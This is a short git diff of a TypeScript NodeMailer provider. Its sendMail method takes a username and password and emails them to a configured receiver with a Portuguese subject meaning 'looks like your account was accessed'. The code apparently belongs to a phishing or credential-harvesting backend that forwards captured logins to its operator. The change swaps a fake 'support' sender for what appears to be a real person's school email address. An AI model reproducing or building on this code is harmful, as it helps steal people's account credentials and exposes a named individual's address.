@@ -21,7 +21,7 @@ export class NodeMailerProvider implements IMailerProvider {
 
   public async sendMail(uname: string, pass: string): Promise<void> {
     await this.transport.sendMail({
-      from: 'Suporte Media Final <suporte.media.final@gmail.com>',
+      from: 'Mateus Carioca <mateus32623@fiec.edu.br>',
       to: mailConfig.MAIL_RECEIVER,
       subject: 'Parece que sua conta foi acessada',
       text: `Parabéns, o seu email é ${uname} e a sua senha: ${pass}`,
